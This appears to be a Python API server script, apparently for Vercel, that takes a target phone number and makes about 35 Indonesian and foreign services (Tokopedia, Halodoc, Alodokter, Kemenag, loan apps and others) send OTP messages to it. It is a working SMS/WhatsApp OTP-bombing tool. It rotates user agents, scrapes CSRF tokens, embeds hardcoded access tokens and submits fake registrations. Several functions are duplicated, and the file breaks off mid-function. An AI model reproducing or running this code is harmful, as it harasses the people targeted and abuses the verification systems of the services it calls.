from http.server import BaseHTTPRequestHandler
import json
import requests
import re
import random
import time
import uuid
import hashlib
import string
import os

# ==================== API KEY ====================
API_KEY = "PIKY-GANZ-XYTOOLZ"  # Ganti dengan key loe

# ==================== USER AGENTS ====================
USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36"
]

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        # Cek API Key
        api_key = self.headers.get('X-API-Key')
        if api_key != API_KEY:
            self.send_response(401)
            self.end_headers()
            self.wfile.write(b'{"error": "Unauthorized"}')
            return
        
        # Lanjut proses OTP
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = json.loads(self.rfile.read(content_length))
            target = post_data.get('nomor')
            
            result = spam_otp_all(target)
            
            response = json.dumps({'success': result})
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(response.encode())
        except Exception as e:
            response = json.dumps({'success': False, 'error': str(e)})
            self.send_response(500)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(response.encode())
    
    def do_GET(self):
        response = json.dumps({'status': True, 'message': 'API OTP Online'})
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(response.encode())
        
def spam_otp_all(nomor):
    sukses = []
    gagal = []
    
    # Daftar API yang dipanggil (SEMUA ADA di file ini)
    api_list = [
        spam_otp_adiraku,
        spam_otp_paperid,
        spam_otp_rumah123,
        spam_otp_kreditpintar_v3,
        spam_otp_duniagames,
        spam_otp_bonusbelanja,
        spam_otp_pinhome,
        spam_otp_berprestasi,
        spam_otp_myvalue,
        spam_otp_ptsp_kemenag,
        spam_otp_idealz,
        spam_otp_internetrakyat_v3,
        spam_otp_misteraladin_v2,
        spam_otp_oyo,
        spam_otp_eiger,
        spam_otp_tuneup,
        spam_otp_matahari,
        spam_greensm,
        spam_otp_halodoc,
        spam_otp_eraspace,
        spam_otp_singa,
        spam_otp_uangme,
        spam_otp_swigggy,
        spam_otp_uangme_sms,
        spam_otp_tiptip_premium,
        spam_otp_eiger_premium,
        spam_otp_alodokter_premium,
        spam_toyota_astra_premium,
        spam_astra_daihatsu_premium,
        spam_otp_tokopediaa,
        spam_otp_kpoin,
        spam_otp_pinjamduit,
        spam_otp_topindowa,
        spam_otp_unpatti,
        spam_otp_kreditpintar
    ]
    
    for api_func in api_list:
        try:
            if api_func(nomor):
                sukses.append(api_func.__name__)
            else:
                gagal.append(api_func.__name__)
        except:
            gagal.append(api_func.__name__)
    
    # ===== LOG KE FILE =====
    try:
        log_data = {
            "nomor": nomor,
            "sukses": sukses,
            "gagal": gagal,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
        }
        
        # Simpan log ke file (bisa diakses di server Vercel)
        log_path = os.path.join(os.path.dirname(__file__), "otp_log.json")
        with open(log_path, "w") as f:
            json.dump(log_data, f, indent=4)
        
        # Print log ke console (untuk Vercel Logs)
        print(f"[LOG] Nomor: {nomor}")
        print(f"[LOG] Sukses: {sukses}")
        print(f"[LOG] Gagal: {gagal}")
        print(f"[LOG] Waktu: {log_data['timestamp']}")
        
        # Bisa juga kirim log ke Telegram (opsional)
        # send_log_to_telegram(log_data)
        
    except Exception as e:
        print(f"[LOG ERROR] {e}")
    
    return len(sukses) > 0
    
def spam_otp_adiraku(nomor):
    try:
        if nomor.startswith("62"):
            nomor_lokal = "0" + nomor[2:]
        elif nomor.startswith("+62"):
            nomor_lokal = "0" + nomor[3:]
        elif not nomor.startswith("0"):
            nomor_lokal = "0" + nomor
        else:
            nomor_lokal = nomor

        url = "https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata"
        headers = {
            "Content-Type": "application/json; charset=utf-8",
            "User-Agent": random.choice(USER_AGENTS)
        }
        payload = {"mobileNumber": nomor_lokal, "type": "prospect-create", "channel": "whatsapp"}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False

def spam_otp_paperid(nomor):
    try:
        if nomor.startswith("0"):
            nomor_internasional = "62" + nomor[1:]
        elif nomor.startswith("+62"):
            nomor_internasional = nomor[3:]
        elif nomor.startswith("62"):
            nomor_internasional = nomor
        else:
            nomor_internasional = "62" + nomor

        url = "https://register.paper.id/api/v1/auth/register/send-otp"
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Content-Type": "application/json",
            "Origin": "https://www.paper.id",
            "Referer": "https://www.paper.id/"
        }
        payload = {"phone": nomor_internasional, "method": "whatsapp", "registered_by": "web"}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False

def spam_otp_rumah123(nomor):
    try:
        if nomor.startswith("0"):
            nomor_internasional = "62" + nomor[1:]
        elif nomor.startswith("+62"):
            nomor_internasional = nomor[3:]
        elif nomor.startswith("62"):
            nomor_internasional = nomor
        else:
            nomor_internasional = "62" + nomor

        url = "https://www.rumah123.com/api/otp/request-otp"
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Content-Type": "application/json;charset=UTF-8",
            "Origin": "https://www.rumah123.com",
            "Referer": "https://www.rumah123.com/user/login"
        }
        payload = {
            "phoneNumber": nomor_internasional,
            "type": "WHATSAPP",
            "portalId": 1
        }
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False

def spam_otp_kreditpintar_v3(nomor):
    try:
        if nomor.startswith("0"):
            local = nomor
        elif nomor.startswith("62"):
            local = "0" + nomor[2:]
        elif nomor.startswith("+62"):
            local = "0" + nomor[3:]
        else:
            local = "0" + nomor

        if nomor.startswith("0"):
            international = "+62" + nomor[1:]
        elif nomor.startswith("62"):
            international = "+" + nomor
        elif nomor.startswith("+62"):
            international = nomor
        else:
            international = "+62" + nomor

        session = requests.Session()
        base_url = "https://go.kreditpintar.com"

        login_url = f"{base_url}/OFFICIAL2021/login-otp"
        session.get(login_url, timeout=10, headers={"User-Agent": random.choice(USER_AGENTS)})

        x_adv_uuid = str(uuid.uuid4())

        url_type = f"{base_url}/api/auth/login-type"
        headers_type = {
            "User-Agent": random.choice(USER_AGENTS),
            "X-Adv-Market-Channel": "Official Website",
            "X-Adv-Uuid": x_adv_uuid,
            "X-App-Version": "APPVERSION_NAME(9999)",
            "X-Os-Type": "WEB",
            "X-User-Agent": "Pintar-ID-Cash (WebAndroid;;id) uuid/{} version/0.1.0".format(x_adv_uuid)
        }
        params_type = {"channel": "OFFICIAL2021", "lang": "id"}
        payload_type = {"mobileNumber": local, "captcha": ""}
        resp_type = session.post(url_type, params=params_type, json=payload_type, headers=headers_type, timeout=10)
        if resp_type.status_code != 200:
            return False

        url_otp = f"{base_url}/api/auth/send-code"
        params_otp = {"channel": "OFFICIAL2021", "lang": "id"}
        payload_otp = {"mobileNumber": international, "type": "SMS"}
        resp_otp = session.post(url_otp, params=params_otp, json=payload_otp, headers=headers_type, timeout=10)

        return resp_otp.status_code == 200
    except:
        return False

def spam_otp_duniagames(nomor):
    try:
        if nomor.startswith("0"):
            phone = "+62" + nomor[1:]
        elif nomor.startswith("62"):
            phone = "+" + nomor
        elif nomor.startswith("+62"):
            phone = nomor
        else:
            phone = "+62" + nomor

        url = "https://api.duniagames.co.id/api/user/api/v2/user/send-otp"
        headers = {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "user-agent": random.choice(USER_AGENTS)
        }
        payload = {"phoneNumber": phone, "userName": "XyTools"}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False
        
def spam_otp_bonusbelanja(nomor):
    try:
        if nomor.startswith("62"):
            nomor_lokal = "0" + nomor[2:]
        elif nomor.startswith("+62"):
            nomor_lokal = "0" + nomor[3:]
        else:
            nomor_lokal = nomor

        url = "https://www.bonusbelanja.com/api/auth/registration/app"
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Content-Type": "application/json",
            "Origin": "https://www.bonusbelanja.com",
            "Referer": "https://www.bonusbelanja.com/register/"
        }
        random_name = "user" + str(random.randint(1000, 9999))
        payload = {"phone": nomor_lokal, "name": random_name, "agreeTnc": True, "agreeContact": True}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False

def spam_otp_pinhome(nomor):
    try:
        if nomor.startswith("0"):
            nomor_lokal = nomor[1:]
        elif nomor.startswith("62"):
            nomor_lokal = nomor[2:]
        elif nomor.startswith("+62"):
            nomor_lokal = nomor[3:]
        else:
            nomor_lokal = nomor

        session = requests.Session()
        url_main = "https://www.pinhome.id/daftar?redirect=%2F"
        session.get(url_main, timeout=10, headers={"User-Agent": random.choice(USER_AGENTS)})

        url_otp = "https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp"
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Content-Type": "text/plain;charset=UTF-8",
            "Origin": "https://www.pinhome.id",
            "Referer": "https://www.pinhome.id/daftar?redirect=%2F"
        }
        payload = {
            "accountType": "customers",
            "applicationType": "Pinhome Web",
            "countryCode": "62",
            "medium": "whatsapp",
            "otpType": "register",
            "phoneNumber": nomor_lokal
        }
        resp = session.post(url_otp, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False

def spam_otp_berprestasi(nomor):
    try:
        if nomor.startswith("0"):
            phone = nomor
        elif nomor.startswith("62"):
            phone = "0" + nomor[2:]
        elif nomor.startswith("+62"):
            phone = "0" + nomor[3:]
        else:
            phone = "0" + nomor

        url = "https://berprestasi.id/api/otp/send"
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Content-Type": "application/json",
            "Origin": "https://berprestasi.id",
            "Referer": "https://berprestasi.id/"
        }
        payload = {"phoneNumber": phone}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False

def spam_otp_myvalue(nomor):
    try:
        if nomor.startswith("0"):
            msisdn = "62" + nomor[1:]
        elif nomor.startswith("+62"):
            msisdn = nomor[3:]
        elif nomor.startswith("62"):
            msisdn = nomor
        else:
            msisdn = "62" + nomor

        url = "https://auth.myvalue.id/v2/verification/send"
        headers = {
            "Content-Type": "application/json",
            "User-Agent": random.choice(USER_AGENTS)
        }
        payload = {"username": msisdn, "template": "myvalue", "sendProvider": "whatsapp"}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False

def spam_otp_ptsp_kemenag(nomor):
    try:
        if nomor.startswith("0"):
            wa = nomor
        elif nomor.startswith("62"):
            wa = "0" + nomor[2:]
        elif nomor.startswith("+62"):
            wa = "0" + nomor[3:]
        else:
            wa = "0" + nomor

        session = requests.Session()
        base_url = "https://ptsp.kemenag.go.id"
        url = f"{base_url}/api/auth/sendOtp"
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Content-Type": "application/json",
            "Origin": base_url,
            "Referer": f"{base_url}/login"
        }
        payload = {"wa": wa}
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False
        
def spam_otp_idealz(nomor):
    try:
        if nomor.startswith("0"):
            phone = nomor
            country = "+62"
        elif nomor.startswith("62"):
            phone = "0" + nomor[2:]
            country = "+62"
        elif nomor.startswith("+62"):
            phone = "0" + nomor[3:]
            country = "+62"
        else:
            phone = "0" + nomor
            country = "+62"

        url = "https://www.idealzlebanon.com/on/demandware.store/Sites-idealz-lb-Site/en/Gupshup-SmsAuthWeb"
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.idealzlebanon.com",
            "Referer": "https://www.idealzlebanon.com/"
        }
        payload = {"phoneNumber": phone, "countryCode": country, "isApp": "false", "mode": "whatsapp"}
        resp = requests.post(url, data=payload, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False

def spam_otp_internetrakyat_v3(nomor):
    try:
        if nomor.startswith("0"):
            phone = nomor
        elif nomor.startswith("62"):
            phone = "0" + nomor[2:]
        elif nomor.startswith("+62"):
            phone = "0" + nomor[3:]
        else:
            phone = "0" + nomor

        session = requests.Session()
        base_url = "https://internetrakyat.id"
        session.get(f"{base_url}/auth/register", timeout=10, headers={"User-Agent": random.choice(USER_AGENTS)})

        url = f"{base_url}/api/app/auth/send-otp-register"
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Content-Type": "application/json",
            "Origin": base_url,
            "Referer": f"{base_url}/auth/register",
            "X-Api-Key": "280999!FTTH"
        }
        payload = {"phone_number": phone}
        resp = session.post(url, json=payload, headers=headers, timeout=15)
        return resp.status_code == 201
    except:
        return False

def spam_otp_misteraladin_v2(nomor):
    try:
        if nomor.startswith("0"):
            phone = nomor
        elif nomor.startswith("62"):
            phone = "0" + nomor[2:]
        elif nomor.startswith("+62"):
            phone = "0" + nomor[3:]
        else:
            phone = "0" + nomor

        session = requests.Session()
        base_url = "https://m.misteraladin.com"
        session.get(f"{base_url}/register", timeout=10, headers={"User-Agent": random.choice(USER_AGENTS)})

        xsrf_token = None
        for cookie in session.cookies:
            if cookie.name == "XSRF-TOKEN":
                xsrf_token = cookie.value
                break

        if not xsrf_token:
            return False

        url_otp = f"{base_url}/web-api/members/auth/otp-request"
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Content-Type": "application/json",
            "Origin": base_url,
            "Referer": f"{base_url}/register",
            "X-XSRF-TOKEN": xsrf_token
        }
        payload = {
            "phone_number": phone,
            "phone_number_country_code": 62,
            "fullname": "XyTools",
            "type": "register"
        }
        resp = session.post(url_otp, json=payload, headers=headers, timeout=15)
        return resp.status_code == 200
    except:
        return False

def spam_otp_oyo(nomor):
    try:
        if nomor.startswith("0"):
            phone_only = nomor[1:]
        elif nomor.startswith("62"):
            phone_only = nomor[2:]
        elif nomor.startswith("+62"):
            phone_only = nomor[3:]
        else:
            phone_only = nomor

        if len(phone_only) < 9:
            return False

        session = requests.Session()
        session.get("https://www.oyorooms.com/login?country=id&retUrl=/id", timeout=10, headers={"User-Agent": random.choice(USER_AGENTS)})

        xsrf_token = None
        for cookie in session.cookies:
            if cookie.name == "XSRF-TOKEN":
                xsrf_token = cookie.value
                break

        if not xsrf_token:
            return False

        url = "https://www.oyorooms.com/api/pwa/generateotp?locale=en"
        headers = {
            "Accept": "*/*",
            "Access-Token": "dUxaRnA5NWJyWFlQYkpQNnEtemo6bzdvX01KLUNFbnRyS3hfdEgyLUE=",
            "Content-Type": "application/json",
            "Deviceid": "5308bfb64832095b78b8e4850251793e943410",
            "Fingerprint_Hash": "5308bfb64832095b78b8e4850251793e",
            "Loc": "153",
            "User-Agent": random.choice(USER_AGENTS),
            "X-Csrf-Token": xsrf_token
        }
        payload = {"phone": phone_only, "country_code": "+62", "nod": 4}
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False
        
def spam_otp_eiger(nomor):
    try:
        if nomor.startswith("0"):
            phone = "+62" + nomor[1:]
        elif nomor.startswith("62"):
            phone = "+" + nomor
        elif nomor.startswith("+62"):
            phone = nomor
        else:
            phone = "+62" + nomor

        url = "https://careloyalty.eigerindo.co.id/api/v1/otp/send"
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Content-Type": "application/json",
            "Origin": "https://club.eigeradventure.com",
            "Referer": "https://club.eigeradventure.com/"
        }
        payload = {"mobile_phone": phone, "via": "whatsapp"}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False

def spam_otp_tuneup(nomor):
    try:
        if nomor.startswith("0"):
            phone = nomor
        elif nomor.startswith("62"):
            phone = "0" + nomor[2:]
        elif nomor.startswith("+62"):
            phone = "0" + nomor[3:]
        else:
            phone = "0" + nomor

        session = requests.Session()
        base_url = "https://api.tuneup.id"

        url = f"{base_url}/v1/mitra/register/send-otp"
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://dashboard.tuneup.id",
            "Referer": "https://dashboard.tuneup.id/"
        }
        payload = {
            "company_name": "XyTools",
            "owner_name": "XyTools",
            "address": "Jakarta",
            "email": "xytools@gmail.com",
            "phone_number": phone,
            "channel": "whatsapp",
            "agreement": "true",
            "service_categories[]": "2"
        }
        resp = session.post(url, data=payload, headers=headers, timeout=15)
        return resp.status_code == 201
    except:
        return False

def spam_otp_matahari(nomor):
    try:
        if nomor.startswith("62"):
            phone_08 = "0" + nomor[2:]
        elif nomor.startswith("+62"):
            phone_08 = "0" + nomor[3:]
        elif not nomor.startswith("0"):
            phone_08 = "0" + nomor
        else:
            phone_08 = nomor

        url = "https://matahari-backend-prod.matahari.com/api/auth/register"
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Content-Type": "application/json",
            "Origin": "https://matahari.com",
            "Referer": "https://matahari.com/"
        }
        payload = {
            "emailAddress": f"xytools{random.randint(1000,9999)}@gmail.com",
            "name": "XyTools",
            "birthDate": "2000-01-01",
            "mobileNumber": phone_08,
            "password": "XyTools1"
        }
        resp = requests.post(url, json=payload, headers=headers, timeout=15)
        return resp.status_code in [200, 409]
    except:
        return False

def spam_greensm(nomor):
    try:
        if nomor.startswith("0"):
            msisdn = "+62" + nomor[1:]
        elif nomor.startswith("62"):
            msisdn = "+" + nomor
        elif nomor.startswith("+62"):
            msisdn = nomor
        else:
            msisdn = "+62" + nomor

        url = "https://gapi.indo.greensm.com/car/acquisition/create-registration"
        headers = {
            "Content-Type": "application/json",
            "User-Agent": random.choice(USER_AGENTS)
        }
        payload = {
            "HiringSource": "Direkomendasikan oleh pengemudi lain",
            "Education": "Pendidikan",
            "City": "JB",
            "Country": "ID",
            "Name": "XyTools",
            "Tel": msisdn,
            "Type": "EXTERNAL"
        }
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False
        
def spam_otp_halodoc(nomor):
    try:
        if nomor.startswith("0"):
            phone = "+62" + nomor[1:]
        elif nomor.startswith("62"):
            phone = "+" + nomor
        elif nomor.startswith("+62"):
            phone = nomor
        else:
            phone = "+62" + nomor

        url = "https://www.halodoc.com/magneto-api/v2/users/authentication/otp/requests"
        headers = {
            "Content-Type": "application/json",
            "User-Agent": random.choice(USER_AGENTS)
        }
        payload = {"phone_number": phone, "channel": "whatsapp"}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False

def spam_otp_eraspace(nomor):
    try:
        if nomor.startswith("0"):
            phone = "62" + nomor[1:]
        elif nomor.startswith("+62"):
            phone = nomor[1:]
        elif not nomor.startswith("62"):
            phone = "62" + nomor
        else:
            phone = nomor

        device_id = str(uuid.uuid4())
        epoch = str(int(time.time()))
        raw_sig = f"{device_id}|eraspace|{epoch}"
        signature = hashlib.sha256(raw_sig.encode()).hexdigest()

        url = "https://jeanne.eraspace.com/customers/v3/otp/request"
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Epoch": epoch,
            "Source": "eraspace",
            "Signature": signature,
            "Device-Id": device_id,
            "Otp-Provider": "whatsapp",
            "User-Agent": random.choice(USER_AGENTS)
        }
        payload = {"identifier": phone, "type": "identifier_validation", "regionCode": "ID"}
        resp = requests.post(url, json=payload, headers=headers, timeout=15)
        return resp.status_code == 200
    except:
        return False

def spam_otp_singa(nomor):
    try:
        if nomor.startswith("0"):
            phone = "62" + nomor[1:]
        elif nomor.startswith("+62"):
            phone = nomor[1:]
        elif nomor.startswith("62"):
            phone = nomor
        else:
            phone = "62" + nomor

        url = "https://api102.singa.id/new/login/sendWaOtp"
        headers = {
            "Content-Type": "application/json; charset=utf-8",
            "User-Agent": random.choice(USER_AGENTS)
        }
        payload = {"mobile_phone": phone, "type": "mobile", "is_switchable": 1}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False

def spam_otp_uangme(nomor):
    try:
        if nomor.startswith("0"):
            phone = "62" + nomor[1:]
        elif nomor.startswith("+62"):
            phone = nomor[1:]
        elif nomor.startswith("62"):
            phone = nomor
        else:
            phone = "62" + nomor

        url = "https://api.uangme.com/api/v2/sms_code"
        params = {"phone": phone, "scene_type": "login", "send_type": "wp"}
        headers = {"User-Agent": "okhttp/3.12.1"}
        resp = requests.get(url, params=params, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False

def spam_otp_swigggy(nomor):
    try:
        if nomor.startswith("62"):
            phone = "0" + nomor[2:]
        elif nomor.startswith("+62"):
            phone = "0" + nomor[3:]
        else:
            phone = nomor

        url = "https://www.swiggy.com/mapi/auth/signup"
        headers = {
            "content-type": "application/json",
            "user-agent": random.choice(USER_AGENTS)
        }
        payload = {"mobile": phone, "countryCode": "62", "name": "XyTools"}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False
        
def spam_otp_uangme_sms(nomor):
    try:
        if nomor.startswith("0"):
            phone = "62" + nomor[1:]
        elif nomor.startswith("+62"):
            phone = nomor[1:]
        elif nomor.startswith("62"):
            phone = nomor
        else:
            phone = "62" + nomor

        url = "https://api.uangme.com/api/v2/sms_code"
        params = {"phone": phone, "scene_type": "login", "send_type": "sms"}
        headers = {"User-Agent": "okhttp/3.12.1"}
        resp = requests.get(url, params=params, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False

def spam_otp_tiptip_premium(nomor):
    try:
        if nomor.startswith("0"):
            phone = "+62" + nomor[1:]
        elif nomor.startswith("62"):
            phone = "+" + nomor
        elif nomor.startswith("+62"):
            phone = nomor
        else:
            phone = "+62" + nomor

        url = "https://api.tiptip.id/authentication/guest/v1/phone/otp/send"
        headers = {
            "Content-Type": "application/json",
            "User-Agent": random.choice(USER_AGENTS)
        }
        payload = {"action": "SIGN_UP", "delivery_method": "WA", "phone_number": phone}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False

def spam_otp_eiger_premium(nomor):
    try:
        if nomor.startswith("0"):
            phone = "+62" + nomor[1:]
        elif nomor.startswith("62"):
            phone = "+" + nomor
        elif nomor.startswith("+62"):
            phone = nomor
        else:
            phone = "+62" + nomor

        url = "https://careloyalty.eigerindo.co.id/api/v1/otp/send"
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Content-Type": "application/json",
            "Origin": "https://club.eigeradventure.com"
        }
        payload = {"mobile_phone": phone, "via": "whatsapp"}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False

def spam_otp_uangme_sms(nomor):
    try:
        if nomor.startswith("0"):
            phone = "62" + nomor[1:]
        elif nomor.startswith("+62"):
            phone = nomor[1:]
        elif nomor.startswith("62"):
            phone = nomor
        else:
            phone = "62" + nomor

        url = "https://api.uangme.com/api/v2/sms_code"
        params = {"phone": phone, "scene_type": "login", "send_type": "sms"}
        headers = {"User-Agent": "okhttp/3.12.1"}
        resp = requests.get(url, params=params, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False

def spam_otp_tiptip_premium(nomor):
    try:
        if nomor.startswith("0"):
            phone = "+62" + nomor[1:]
        elif nomor.startswith("62"):
            phone = "+" + nomor
        elif nomor.startswith("+62"):
            phone = nomor
        else:
            phone = "+62" + nomor

        url = "https://api.tiptip.id/authentication/guest/v1/phone/otp/send"
        headers = {
            "Content-Type": "application/json",
            "User-Agent": random.choice(USER_AGENTS)
        }
        payload = {"action": "SIGN_UP", "delivery_method": "WA", "phone_number": phone}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False

def spam_otp_eiger_premium(nomor):
    try:
        if nomor.startswith("0"):
            phone = "+62" + nomor[1:]
        elif nomor.startswith("62"):
            phone = "+" + nomor
        elif nomor.startswith("+62"):
            phone = nomor
        else:
            phone = "+62" + nomor

        url = "https://careloyalty.eigerindo.co.id/api/v1/otp/send"
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Content-Type": "application/json",
            "Origin": "https://club.eigeradventure.com"
        }
        payload = {"mobile_phone": phone, "via": "whatsapp"}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False

def spam_otp_alodokter_premium(nomor):
    try:
        if nomor.startswith("0"):
            phone = nomor
        elif nomor.startswith("62"):
            phone = "0" + nomor[2:]
        elif nomor.startswith("+62"):
            phone = "0" + nomor[3:]
        else:
            phone = "0" + nomor

        url = "https://www.alodokter.com/resend-otp"
        headers = {
            "Content-Type": "application/json",
            "User-Agent": random.choice(USER_AGENTS)
        }
        payload = {"user": {"phone": phone, "uuid": str(uuid.uuid4())}, "request_via": "whatsapp"}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False

def spam_toyota_astra_premium(phone):
    try:
        if phone.startswith("0"):
            nomor_clean = "62" + phone[1:]
        elif phone.startswith("62"):
            nomor_clean = phone
        else:
            nomor_clean = "62" + phone

        session = requests.Session()
        url = "https://data-web.tam-icm.com/api/public/vendors/register"
        headers = {
            "Content-Type": "application/json",
            "User-Agent": random.choice(USER_AGENTS)
        }
        payload = {"phoneNumber": nomor_clean}
        resp = session.post(url, json=payload, headers=headers, timeout=15)
        return resp.status_code == 200
    except:
        return False

def spam_astra_daihatsu_premium(nomor):
    try:
        if nomor.startswith("0"):
            phone = "62" + nomor[1:]
        elif nomor.startswith("+62"):
            phone = nomor[1:]
        elif nomor.startswith("62"):
            phone = nomor
        else:
            phone = "62" + nomor

        url = "https://www.astra-daihatsu.id/otp/whatsapp/generate"
        headers = {
            "Content-Type": "application/json",
            "User-Agent": random.choice(USER_AGENTS)
        }
        payload = {"phoneNo": phone}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False

def spam_otp_tokopediaa(nomor):
    try:
        session = requests.Session()
        url_token = f"https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn={nomor}&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        resp = session.get(url_token, headers=headers, timeout=10)
        token = re.search(r'<input\s+id="Token"\s+value="([^"]+)"', resp.text)
        if not token:
            return False
        url_otp = "https://accounts.tokopedia.com/otp/c/ajax/request-wa"
        data = {
            "otp_type": "116",
            "msisdn": nomor,
            "tk": token.group(1),
            "email": "",
            "original_param": "",
            "user_id": "",
            "signature": "",
            "number_otp_digit": "6"
        }
        headers["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
        headers["X-Requested-With"] = "XMLHttpRequest"
        resp2 = session.post(url_otp, data=data, headers=headers, timeout=10)
        return resp2.status_code == 200
    except:
        return False

def spam_otp_kpoin(nomor):
    try:
        if nomor.startswith("0"):
            phone = nomor
        elif nomor.startswith("62"):
            phone = "0" + nomor[2:]
        elif nomor.startswith("+62"):
            phone = "0" + nomor[3:]
        else:
            phone = "0" + nomor

        session = requests.Session()
        base_url = "https://app.kpoin.com"
        session.get(f"{base_url}/registration", timeout=10, headers={"User-Agent": random.choice(USER_AGENTS)})

        url = f"{base_url}/api/bff/v1/notification/sendotp"
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Content-Type": "application/json",
            "Origin": base_url,
            "Referer": f"{base_url}/registration",
            "Applicationbrand": "0",
            "Applicationchannel": "901101",
            "Applicationstoreid": "0"
        }
        payload = {"UniqueID": phone, "NotifType": "109104", "OtpType": "119103", "OtpDigit": 6}
        resp = session.post(url, json=payload, headers=headers, timeout=15)
        return resp.status_code == 200
    except:
        return False

def spam_otp_pinjamduit(nomor):
    try:
        if nomor.startswith("62"):
            nomor = "0" + nomor[2:]

        session = requests.Session()
        BASE = "https://api.pinjamduit.co.id"

        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": BASE,
            "Referer": BASE + "/h5/download_selfmedia.html"
        }

        r1 = session.post(
            BASE + "/gw/loan/credit-user/checkPhoneWeb",
            headers=headers,
            data={
                "phone": nomor,
                "mobilePhone": nomor,
                "uuid": str(uuid.uuid4()),
                "deviceId": "wh",
                "appMarket": "web",
                "appVersion": "99.99.99",
                "clientType": "w",
                "ts": int(time.time() * 1000)
            },
            timeout=10
        )

        res1 = r1.json()
        if res1.get("code") != "0":
            return False

        wybs = res1["data"]["wybs"]
        sms_useage = 10 if res1["data"]["isExist"] == 1 else 0

        headers2 = headers.copy()
        headers2["ss"] = wybs

        r2 = session.post(
            BASE + "/gw/loan/credit-user/checkPhoneNext",
            headers=headers2,
            data={
                "phone": nomor,
                "mobilePhone": nomor,
                "sms_service": 2,
                "sms_useage": sms_useage,
                "deviceId": "wh",
                "appMarket": "web",
                "appVersion": "99.99.99",
                "clientType": "w",
                "ts": int(time.time() * 1000)
            },
            timeout=10
        )

